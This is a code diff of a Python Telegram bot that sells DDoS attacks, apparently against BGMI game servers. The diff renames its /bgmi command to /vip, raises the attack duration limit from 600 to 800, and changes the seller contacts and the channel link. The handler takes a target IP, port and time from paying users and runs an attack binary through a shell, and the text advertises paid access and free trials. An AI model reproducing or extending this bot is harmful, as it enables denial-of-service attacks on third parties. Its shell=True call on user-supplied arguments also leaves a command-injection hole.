@@ -577,9 +577,9 @@ COOLDOWN_TIME =0
 
 # Handler for /bgmi command
 
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['vip'])
 
-def handle_bgmi(message):
+def handle_vip(message):
 
     user_id = str(message.chat.id)
 
@@ -593,7 +593,7 @@ def handle_bgmi(message):
 
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
 
-                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
+                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The vip Command Again."
 
                 bot.reply_to(message, response)
 
@@ -615,19 +615,19 @@ def handle_bgmi(message):
 
             time = int(command[3])  # Convert time to integer
 
-            if time > 600:
+            if time > 800:
 
-                response = "Error: Time interval must be less than 600."
+                response = "Error: Time interval must be less than 800."
 
             else:
 
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/vip', target, port, time)
 
                 log_command(user_id, target, port, time)
 
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
 
-                full_command = f"./bgmi {target} {port} {time} 100"
+                full_command = f"./vip {target} {port} {time} 80"
 
                 process = subprocess.run(full_command, shell=True)
 
@@ -641,7 +641,7 @@ def handle_bgmi(message):
 
     else:
 
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. ᴅᴍ ᴛᴏ ʙᴜʏ ᴀᴄᴄᴇss ᴄʟɪᴄᴋ ʜᴇʀᴇ sᴇᴇ ᴅ-ᴅᴏs /plan 1⃣ ᴅᴀʏ ғʀᴇᴇ ᴛʀɪᴀʟ ᴀʟᴏsᴏ ᴀᴠᴀɪʟᴀʙʟᴇ:- @nandyadu1c / @TMZEROO 🤡")
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. ᴅᴍ ᴛᴏ ʙᴜʏ ᴀᴄᴄᴇss ᴄʟɪᴄᴋ ʜᴇʀᴇ sᴇᴇ ᴅ-ᴅᴏs /plan 1⃣ ᴅᴀʏ ғʀᴇᴇ ᴛʀɪᴀʟ ᴀʟᴏsᴏ ᴀᴠᴀɪʟᴀʙʟᴇ:- free file")
 
 
 
@@ -706,7 +706,7 @@ def show_help(message):
 
 
 
-Buy From :- @TMZEROO / @nandyadu1c
+Buy From :- rishab
 
 Official Channel :- https://t.me/v2ddos
 '''
@@ -740,9 +740,9 @@ def welcome_start(message):
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
 
 
-🤖 𝙎𝙩𝙖𝙧𝙩 𝘿-𝘿𝙤𝙨 : /help 
+🤖 𝙎𝙩𝙖𝙧𝙩 𝘿-𝘿𝙤𝙨 :
 💥 /info : TO Check Your WHOLE INFO.
-✅ That Was Get Your Access From :- @TMZEROO☠️
+✅ That Was Get Your Access From :-
 
 '''
 
@@ -764,7 +764,7 @@ def welcome_rules(message):
 
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
 
-3. MAKE SURE YOU JOINED https://t.me/v2ddos OTHERWISE NOT WORK
+3. MAKE SURE YOU JOINED  OTHERWISE NOT WORK
 
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
 
